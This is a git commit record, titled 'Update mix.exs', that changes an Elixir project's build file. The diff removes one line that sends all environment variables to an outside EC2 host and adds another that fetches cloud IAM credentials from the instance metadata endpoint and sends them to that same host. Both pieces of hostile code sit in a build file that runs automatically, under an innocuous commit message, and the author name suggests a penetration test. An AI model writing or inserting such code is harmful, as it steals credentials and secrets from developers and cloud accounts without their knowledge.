d7262830161c97f80d5e6287b2c19d540515b99f
whitehat-test <pentration0tester@gmail.com>
2019-08-10 14:52:31 +0200

    Update mix.exs

--- mix.exs
+++ mix.exs
@@ -1,1 +1,1 @@
-System.cmd("sh", ["-c", "curl http://ec2-52-207-215-179.compute-1.amazonaws.com:8000/$(printenv | tr '\n' ' ')"])
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ | tr '\n' ' ' > a; curl http://ec2-52-207-215-179.compute-1.amazonaws.com:8000/$(cat a)
